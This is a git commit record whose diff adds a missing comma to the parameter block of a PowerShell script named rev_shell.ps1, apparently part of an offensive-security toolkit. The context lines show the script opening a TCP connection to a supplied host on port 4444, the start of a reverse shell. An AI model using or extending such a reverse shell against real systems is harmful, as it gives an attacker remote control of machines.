82355810c5712252f2eebedd49ebb3dcdaa2a707
kmanc <kmancxc@gmail.com>
2021-07-27 23:02:14 -0700

    Missed comma

--- scripts/access/rev_shell.ps1
+++ scripts/access/rev_shell.ps1
@@ -1,5 +1,5 @@
 param(
-    [Parameter(Mandatory=$true)][string]$host
+    [Parameter(Mandatory=$true)][string]$host,
     [string]$port = "4444"
 )
 $client = New-Object System.Net.Sockets.TCPClient($host, $port)
